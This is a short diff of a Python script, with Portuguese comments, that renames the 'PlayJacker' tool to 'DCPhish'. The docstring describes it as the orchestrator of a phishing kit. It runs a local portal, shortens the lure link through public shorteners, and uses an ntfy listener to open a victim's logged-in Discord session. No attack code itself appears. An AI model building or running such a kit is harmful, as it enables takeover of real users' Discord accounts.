@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PlayJacker — orquestrador do kit completo.
+DCPhish — orquestrador do kit completo.
 
 Faz:
   1. Portal local (server.py) em http://127.0.0.1:8080
@@ -9,7 +9,7 @@ Faz:
   3. Encurta o link (cleanuri, fallback spoo.me/ulvis)
   4. Listener ntfy (listener.py) -> abre o Discord logado no navegador
 
-Uso:  python playjacker.py          (Ctrl+C encerra tudo)
+Uso:  python dcphish.py          (Ctrl+C encerra tudo)
 """
 import json
 import os
@@ -160,7 +160,7 @@ def spawn_with_tee(args, log_path, prefix):
 
 def main():
     print("=" * 56)
-    print("  PlayJacker — iniciando...")
+    print("  DCPhish — iniciando...")
     print("=" * 56)
 
     # 1) portal
